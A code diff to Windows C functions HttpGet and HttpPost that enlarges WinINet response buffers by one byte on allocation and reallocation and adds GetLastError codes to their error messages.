@@ -206,7 +206,7 @@ BOOL HttpGet(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
 		
 		//_dbg("Response is %d bytes ", bytesAvailable);
 
-		dataBuffer = LocalAlloc(LPTR, bytesAvailable);
+		dataBuffer = LocalAlloc(LPTR, bytesAvailable + 1);
 		if (!dataBuffer) {
 			_err("[HTTP] Memory allocation failed.\n");
 			InternetCloseHandle(hInternet);
@@ -234,7 +234,7 @@ BOOL HttpGet(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
 			if (totalBytesRead + bytesRead > bytesAvailable) {
 				// //_dbg("[HTTP] Expanding buffer size.");
 				bytesAvailable = totalBytesRead + bytesRead;
-				dataBuffer = LocalReAlloc(dataBuffer, bytesAvailable, LMEM_MOVEABLE | LMEM_ZEROINIT);
+				dataBuffer = LocalReAlloc(dataBuffer, bytesAvailable + 1, LMEM_MOVEABLE | LMEM_ZEROINIT);
 				if (!dataBuffer) {
 					_err("[HTTP] Memory reallocation failed.\n");
 					InternetCloseHandle(hInternet);
@@ -265,7 +265,7 @@ BOOL HttpGet(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
 		success = TRUE;
 	}
 	else {
-		_err("[HTTP] No data available or response check failed.\n");
+		_err("[HTTP] No data available or response check failed. ERROR : %d\n", GetLastError());
 	}
 
 	InternetCloseHandle(hInternet);
@@ -360,7 +360,7 @@ BOOL HttpPost(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
 		
 		//_dbg("Response contains %d bytes ", bytesAvailable);
 
-		dataBuffer = LocalAlloc(LPTR, bytesAvailable); // Allocate memory for the data
+		dataBuffer = LocalAlloc(LPTR, bytesAvailable + 1);
 		if (!dataBuffer) {
 			_err("[HTTP] Memory allocation failed.\n");
 			return FALSE;
@@ -389,7 +389,7 @@ BOOL HttpPost(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
 			if (totalBytesRead + bytesRead > bytesAvailable) {
 				// //_dbg("[HTTP] Expanding buffer size.");
 				bytesAvailable = totalBytesRead + bytesRead; // Increase the buffer size
-				dataBuffer = LocalReAlloc(dataBuffer, bytesAvailable, LMEM_MOVEABLE | LMEM_ZEROINIT);
+				dataBuffer = LocalReAlloc(dataBuffer, bytesAvailable + 1, LMEM_MOVEABLE | LMEM_ZEROINIT);
 				if (!dataBuffer) {
 					_err("[HTTP] Memory reallocation failed.\n");
 					return FALSE;
@@ -417,7 +417,7 @@ BOOL HttpPost(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
 		success = TRUE;
 	}
 	else {
-		_err("[HTTP] No data available or response check failed.\n");
+		_err("[HTTP] No data available or response check failed. ERROR : %d\n", GetLastError());
 	}
 
 
